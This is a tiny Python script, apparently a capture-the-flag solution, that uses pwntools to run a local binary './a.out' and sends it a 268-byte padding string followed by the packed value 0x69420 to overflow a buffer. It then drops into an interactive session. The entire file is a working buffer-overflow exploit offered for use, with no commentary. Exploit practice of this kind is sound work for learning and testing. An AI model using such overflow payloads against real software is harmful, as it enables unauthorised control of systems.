# coding: utf-8
from pwn import*
def chall00():
    p =process("./a.out")
    p.sendline(b"a"*268 + p32(0x69420))
    p.interactive()
    
chall00()
